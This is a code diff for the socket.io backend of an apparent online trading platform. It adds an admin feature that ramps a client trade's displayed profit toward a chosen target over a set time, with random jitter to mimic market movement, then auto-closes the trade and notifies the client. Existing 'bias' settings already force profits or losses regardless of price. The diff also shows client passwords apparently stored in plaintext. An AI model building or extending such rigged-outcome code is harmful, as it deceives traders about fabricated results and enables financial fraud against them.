@@ -190,14 +190,42 @@ module.exports = (io) => {
             }
           }
 
-          if (t.bias === 'lock') return;
+          if (t.bias === 'lock' && !(t.timedProfit && t.timedProfit.enabled)) return;
 
           const diff = t.type === 'BUY' ? (currentPrice - t.openPrice) : (t.openPrice - currentPrice);
           const multiplier = t.symbol.includes('USD') && !t.symbol.includes('BTC') ? 10000 : 1;
           const marketProfit = diff * t.lots * multiplier;
 
-          // Apply Bias
-          if (t.bias === 'profit') {
+          // Timed Profit: gradually ramp profit to target over duration, then auto-close
+          if (t.timedProfit && t.timedProfit.enabled && t.timedProfit.startTime) {
+            const elapsed = Date.now() - new Date(t.timedProfit.startTime).getTime();
+            const duration = t.timedProfit.durationMs || 1;
+            const progress = Math.min(elapsed / duration, 1);
+            const jitter = (Math.random() - 0.5) * Math.abs(t.timedProfit.targetProfit) * 0.02;
+            t.profit = (t.timedProfit.targetProfit * progress) + jitter;
+
+            if (progress >= 1) {
+              t.profit = t.timedProfit.targetProfit;
+              t.status = 'Closed';
+              t.closePrice = currentPrice;
+              t.closeTime = new Date().toISOString();
+              t.closedBy = 'System (Timed)';
+              t.comment = `Timed profit target $${t.timedProfit.targetProfit} reached after ${(t.timedProfit.durationMs / 60000).toFixed(0)}min`;
+              t.timedProfit.enabled = false;
+
+              const client = clients.find(c => c.id === clientId);
+              if (client && client.tradingMetrics) {
+                client.tradingMetrics.balance += t.profit + (t.swap || 0);
+              }
+              console.log(`[TIMED CLOSE] ${clientId} trade ${t.id} closed — target profit $${t.timedProfit.targetProfit}`);
+              saveData();
+              io.emit('trade_killed', { tradeId: t.id, reason: 'Timed Profit Target Reached' });
+              const profitStr = t.profit >= 0 ? `+$${t.profit.toFixed(2)}` : `-$${Math.abs(t.profit).toFixed(2)}`;
+              pushNotification('trade_close', `Trade closed: ${t.type} ${t.lots} lots ${t.symbol} — P/L: ${profitStr}`, client);
+              return;
+            }
+          } else if (t.bias === 'profit') {
+            // Apply Bias
             t.profit = Math.abs(marketProfit) * (t.multiplier || 1) + (Math.random() * 0.5);
           } else if (t.bias === 'loss') {
             t.profit = -Math.abs(marketProfit) * (t.multiplier || 1) - (Math.random() * 0.5);
@@ -283,7 +311,7 @@ module.exports = (io) => {
 
     // Broadcast updated market prices, trades, AND sanitized client balances
     const sanitizedClients = clients.map(c => {
-      const { withdrawalPin, password, ...rest } = c;
+      const { withdrawalPin, password, plainPassword, ...rest } = c;
       return { ...rest, hasPin: !!withdrawalPin };
     });
 
@@ -592,6 +620,43 @@ module.exports = (io) => {
       if (trade) {
         trade.selectedPrice = selectedPrice ? parseFloat(selectedPrice) : null;
         console.log(`[ADMIN LIMIT] Trade ${tradeId} selected price set to: ${trade.selectedPrice}`);
+        saveData();
+        io.emit('trade_update', activeTrades);
+        io.emit('client_update', clients);
+      }
+    });
+
+    // ADMIN sets timed profit (target profit + duration, auto-close after time)
+    socket.on('admin_set_timed_profit', (data) => {
+      if (!isAdminSocket()) return;
+      const { clientId, tradeId, targetProfit, durationMinutes } = data;
+      const trade = activeTrades[clientId]?.find(t => t.id === tradeId);
+      if (trade && trade.status === 'Open') {
+        trade.timedProfit = {
+          enabled: true,
+          targetProfit: parseFloat(targetProfit),
+          durationMs: parseFloat(durationMinutes) * 60 * 1000,
+          startTime: new Date().toISOString()
+        };
+        trade.bias = 'lock';
+        console.log(`[ADMIN TIMED PROFIT] Trade ${tradeId}: $${targetProfit} over ${durationMinutes}min`);
+        syncClientMetrics(clientId);
+        saveData();
+        io.emit('trade_update', activeTrades);
+        io.emit('client_update', clients);
+      }
+    });
+
+    // ADMIN cancels timed profit on a trade
+    socket.on('admin_cancel_timed_profit', (data) => {
+      if (!isAdminSocket()) return;
+      const { clientId, tradeId } = data;
+      const trade = activeTrades[clientId]?.find(t => t.id === tradeId);
+      if (trade && trade.timedProfit) {
+        trade.timedProfit = { enabled: false, targetProfit: 0, durationMs: 0, startTime: null };
+        trade.bias = 'none';
+        console.log(`[ADMIN] Timed profit cancelled for trade ${tradeId}`);
+        syncClientMetrics(clientId);
         saveData();
         io.emit('trade_update', activeTrades);
         io.emit('client_update', clients);
